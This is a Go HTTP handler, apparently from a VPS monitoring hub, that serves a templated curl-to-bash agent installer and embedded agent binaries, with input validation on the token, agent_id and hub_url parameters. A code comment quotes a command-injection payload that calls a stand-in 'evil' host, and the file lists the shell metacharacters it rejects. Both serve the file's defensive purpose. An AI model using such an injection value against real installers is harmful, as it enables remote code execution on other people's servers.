package handler

import (
	"bytes"
	"embed"
	"errors"
	"io/fs"
	"log/slog"
	"net/http"
	"regexp"
	"strings"
	"text/template"

	"shiguang-vps/internal/handler/middleware"
	"shiguang-vps/internal/types"
	"shiguang-vps/internal/util"
)

// hubURLPattern restricts the `hub_url` query parameter to a strict
// scheme+host[+port][+path] shape. This is a defence-in-depth filter on top of
// the bash single-quote escaping below: even if the escaping were bypassed
// (e.g. by a future refactor that switched to double-quotes), the value
// still cannot contain shell metacharacters such as `$`, `` ` ``, `\`,
// `;`, `|`, `&`, `(`, `)`, `<`, `>`, `'`, `"`, whitespace, or NUL.
var hubURLPattern = regexp.MustCompile(`^https?://[A-Za-z0-9.\-:]+(/[A-Za-z0-9._\-/]*)?$`)

// installScriptTemplate is the embedded bash template. The Go template
// engine fills {{.Token}} and {{.HubURL}} at request time so the bytes on
// disk never contain secrets.
//
//go:embed templates/install-agent.sh.tmpl
var installScriptTemplateBytes []byte

// agentAssetsFS is the embed.FS holding the cross-compiled agent binaries
// shipped inside the hub binary. The directory is populated by the build
// script T-32 — at v1 development time the directory contains a placeholder
// .gitkeep so the embed compiles. Missing platforms fall through to 404 at
// request time.
//
//go:embed agents
var agentAssetsFS embed.FS

// agentAssetSubdir is the FS subdirectory the install handler serves from.
const agentAssetSubdir = "agents"

// InstallScriptHandler hosts the agent self-install endpoints:
//
//   - GET /_app/<prefix>/install-agent.sh?token=&hub_url=
//   - GET /_app/<prefix>/dl/agent-<os>-<arch>
//
// The silent-mode middleware strips the prefix before this handler runs, so
// the canonical (un-prefixed) routes are /install-agent.sh and
// /dl/agent-{os}-{arch}.
//
// Per §2.9 the bash entrypoint is the only place a token round-trips back
// to the agent — it lives in the URL query string, never in the embedded
// template bytes.
type InstallScriptHandler struct {
	logger *slog.Logger
	tmpl   *template.Template
	// hubURLOverride lets ops force a specific URL (e.g. a public-facing
	// domain) instead of relying on the request's Host header. Empty falls
	// back to the live request.
	hubURLOverride string
}

// InstallScriptHandlerConfig wires the handler.
type InstallScriptHandlerConfig struct {
	Logger         *slog.Logger
	HubURLOverride string
}

// NewInstallScriptHandler parses the embedded template once and returns the
// handler. A parse failure panics — the template is part of the binary so a
// runtime error here would be a deploy-time regression we want to fail
// loudly.
func NewInstallScriptHandler(cfg InstallScriptHandlerConfig) *InstallScriptHandler {
	if cfg.Logger == nil {
		cfg.Logger = slog.Default()
	}
	tmpl, err := template.New("install-agent.sh").
		Option("missingkey=error").
		Parse(string(installScriptTemplateBytes))
	if err != nil {
		panic("install-agent.sh template parse failed: " + err.Error())
	}
	return &InstallScriptHandler{
		logger:         cfg.Logger,
		tmpl:           tmpl,
		hubURLOverride: cfg.HubURLOverride,
	}
}

// installScriptVars is the strict template binding model. Adding a new
// {{.X}} placeholder to the template requires adding a field here so the
// missingkey=error setting can catch typos at request time.
type installScriptVars struct {
	Token   string
	HubURL  string
	AgentID string
	Version string
}

// InstallScript serves the rendered bash installer. The route is in the
// silent-mode whitelist (see middleware/silent_mode.go silentWhitelist) so
// admins can `curl -fsSL https://<host>/_app/<prefix>/install-agent.sh`
// without any other plumbing.
//
// Token is read from the ?token= query parameter and inserted verbatim into
// the template. We DO NOT validate the token against the agent_tokens
// table here — the agent itself proves possession on the WS handshake.
// Refusing unknown tokens at this layer would leak that an agent_id exists.
func (h *InstallScriptHandler) InstallScript(w http.ResponseWriter, r *http.Request) {
	traceID := middleware.TraceIDFromContext(r.Context())
	token := strings.TrimSpace(r.URL.Query().Get("token"))
	if token == "" {
		util.RespondError(w, types.ErrValidationRequiredField, "token query required", nil, traceID)
		return
	}
	if !isPlainToken(token) {
		util.RespondError(w, types.ErrValidationInvalidFormat, "invalid token characters", nil, traceID)
		return
	}
	// agent_id is the hub-assigned UUID the agent must report on the WS hello
	// (the hub cross-checks it against the token). Baked into a single-quoted
	// bash var, so it is validated with the same plain-token allow-list to keep
	// shell metacharacters out. Required: the agent refuses to start without it.
	agentID := strings.TrimSpace(r.URL.Query().Get("agent_id"))
	if agentID == "" {
		util.RespondError(w, types.ErrValidationRequiredField, "agent_id query required", nil, traceID)
		return
	}
	if !isPlainToken(agentID) {
		util.RespondError(w, types.ErrValidationInvalidFormat, "invalid agent_id characters", nil, traceID)
		return
	}
	hubURL := strings.TrimSpace(r.URL.Query().Get("hub_url"))
	if hubURL == "" {
		hubURL = h.deriveHubURL(r)
	}
	hubURL = strings.TrimRight(hubURL, "/")
	// Bug-1 (review-round1): reject any hub_url that does not match the
	// allow-listed pattern. The rendered script writes the value verbatim
	// into a bash variable; without this check a payload of the form
	// `https://x$(curl evil)` would execute inside `curl … | bash`.
	if !isSafeHubURL(hubURL) {
		util.RespondError(w, types.ErrValidationInvalidFormat,
			"invalid hub_url", nil, traceID)
		return
	}

	vars := installScriptVars{
		Token:   token,
		HubURL:  hubURL,
		AgentID: agentID,
		Version: "v1",
	}
	var buf bytes.Buffer
	if err := h.tmpl.Execute(&buf, vars); err != nil {
		h.logger.Error("install-agent.sh render failed",
			slog.String("err", err.Error()),
			slog.String("trace_id", traceID))
		util.RespondError(w, types.ErrInternalUnknown, "render failed", nil, traceID)
		return
	}
	w.Header().Set("Content-Type", "text/x-shellscript; charset=utf-8")
	w.Header().Set("X-Content-Type-Options", "nosniff")
	w.WriteHeader(http.StatusOK)
	_, _ = w.Write(buf.Bytes())
}

// AgentDownload serves GET /dl/agent-<os>-<arch> from the embedded FS. The
// file naming convention mirrors the T-32 build script output:
//
//	internal/handler/agents/agent-linux-amd64
//	internal/handler/agents/agent-linux-arm64
//	internal/handler/agents/agent-darwin-arm64
//	...
//
// Missing platforms surface as 404 — operators see a clear error instead of
// an empty 200 download.
func (h *InstallScriptHandler) AgentDownload(w http.ResponseWriter, r *http.Request) {
	name := r.PathValue("asset")
	if name == "" {
		name = strings.TrimPrefix(r.URL.Path, "/dl/")
	}
	if name == "" {
		http.NotFound(w, r)
		return
	}
	// Defence-in-depth: reject path traversal. embed.FS doesn't expose the
	// parent directory but a corrupted route input could still confuse the
	// fs lookup.
	if strings.Contains(name, "..") || strings.Contains(name, "/") {
		http.NotFound(w, r)
		return
	}
	if !strings.HasPrefix(name, "agent-") {
		http.NotFound(w, r)
		return
	}
	data, err := fs.ReadFile(agentAssetsFS, agentAssetSubdir+"/"+name)
	if err != nil {
		if errors.Is(err, fs.ErrNotExist) {
			http.NotFound(w, r)
			return
		}
		h.logger.Warn("agent asset read failed",
			slog.String("name", name),
			slog.String("err", err.Error()))
		http.NotFound(w, r)
		return
	}
	if len(data) == 0 {
		// The placeholder .gitkeep returns a zero-byte read; treat as 404.
		http.NotFound(w, r)
		return
	}
	w.Header().Set("Content-Type", "application/octet-stream")
	w.Header().Set("X-Content-Type-Options", "nosniff")
	w.Header().Set("Content-Disposition", "attachment; filename=\""+name+"\"")
	_, _ = w.Write(data)
}

// deriveHubURL composes the live hub URL from the incoming request. Honors
// X-Forwarded-Proto / X-Forwarded-Host for reverse-proxy deployments.
func (h *InstallScriptHandler) deriveHubURL(r *http.Request) string {
	if h.hubURLOverride != "" {
		return h.hubURLOverride
	}
	scheme := "https"
	if r.TLS == nil && r.Header.Get("X-Forwarded-Proto") != "https" {
		scheme = "http"
	}
	host := r.Host
	if fwd := r.Header.Get("X-Forwarded-Host"); fwd != "" {
		host = fwd
	}
	return scheme + "://" + host
}

// isSafeHubURL applies the hubURLPattern allow-list AND an explicit reject
// list of bash-significant metacharacters. The allow-list is enough to keep
// every metachar out today; the explicit reject list is the second line of
// defence in case the regex is ever loosened.
func isSafeHubURL(s string) bool {
	if s == "" || len(s) > 512 {
		return false
	}
	for _, r := range s {
		switch r {
		case '$', '`', '\\', '\'', '"', ' ', '\t', '\n', '\r',
			';', '|', '&', '(', ')', '<', '>', '{', '}', 0:
			return false
		}
	}
	return hubURLPattern.MatchString(s)
}

// isPlainToken returns true for tokens consisting only of url-safe
// characters (alpha + digits + dot/dash/underscore). The agent token format
// is hex64 today but we accept the broader set so future formats (jwt,
// base64url) work without code changes.
func isPlainToken(s string) bool {
	if len(s) == 0 || len(s) > 256 {
		return false
	}
	for _, c := range s {
		switch {
		case c >= '0' && c <= '9':
		case c >= 'a' && c <= 'z':
		case c >= 'A' && c <= 'Z':
		case c == '-' || c == '_' || c == '.':
		default:
			return false
		}
	}
	return true
}
